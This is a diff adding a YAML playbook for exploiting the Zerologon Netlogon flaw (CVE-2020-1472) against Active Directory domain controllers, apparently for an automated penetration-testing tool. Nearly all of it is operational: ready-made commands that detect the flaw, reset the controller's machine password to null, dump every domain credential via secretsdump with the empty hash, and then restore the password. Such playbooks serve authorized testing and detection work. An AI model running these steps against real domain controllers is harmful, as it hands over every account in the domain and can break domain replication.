@@ -1,0 +1,42 @@
+id: ad_zerologon
+title: "AD — Zerologon (CVE-2020-1472) Netlogon password reset"
+phase: exploit
+mitre: ["T1210", "T1003"]
+trigger:
+  services: ["smb", "msrpc", "netlogon"]
+  ports:    [445, 135]
+  os_any:   ["windows server"]
+  technologies: ["active directory", "domain controller"]
+  cves:     ["CVE-2020-1472"]
+keywords: ["zerologon", "cve-2020-1472", "netlogon", "MS-NRPC AES-CFB8"]
+preconditions:
+  - "Unpatched DC (Aug 2020 patch missing OR enforcement mode disabled)"
+  - "Network reachability to DC RPC (TCP/445)"
+steps:
+  - tool: nmap
+    cmd:  "nmap -p445 --script=smb-vuln-cve-2020-1472 {dc_ip}"
+    why:  "Detection only — checks the AES-CFB8 vuln window"
+  - tool: zerologon
+    cmd:  "python3 zerologon_tester.py {dc_hostname} {dc_ip}"
+    why:  "Confirms exploitability without actually changing any password"
+  - tool: zerologon
+    cmd:  "python3 cve-2020-1472-exploit.py {dc_hostname} {dc_ip}"
+    why:  "DESTRUCTIVE — empties DC machine account password to a null hash. Restore needed afterwards."
+  - tool: secretsdump
+    cmd:  "secretsdump.py -no-pass -just-dc {domain}/{dc_hostname}\\$@{dc_ip}"
+    why:  "Authenticate as DC$ with the empty hash → DCSync"
+  - tool: secretsdump
+    cmd:  "secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 {domain}/{dc_hostname}\\$@{dc_ip} -just-dc"
+    why:  "Same primitive — pass the literal empty NTLM hash"
+  - tool: reinstall-original-pw
+    cmd:  "python3 reinstall_original_pw.py {dc_hostname} {dc_ip} {original_hex_hash}"
+    why:  "RESTORE the DC machine password after exploit (read from local SAM via secretsdump)"
+expected_outcome: "DC$ machine account hash + DCSync of every domain hash"
+fallbacks:
+  - "Enforcement mode (Feb 2021+) blocks vulnerable channel → exploit no-ops, fall back to other paths"
+  - "Always restore the machine password — leaving it null breaks domain replication"
+  - "Modern AVs detect zerologon via signature on the empty Netlogon Authenticator field"
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2020-1472"
+  - "https://github.com/dirkjanm/CVE-2020-1472"
+  - "https://www.secura.com/uploads/whitepapers/Zerologon.pdf"
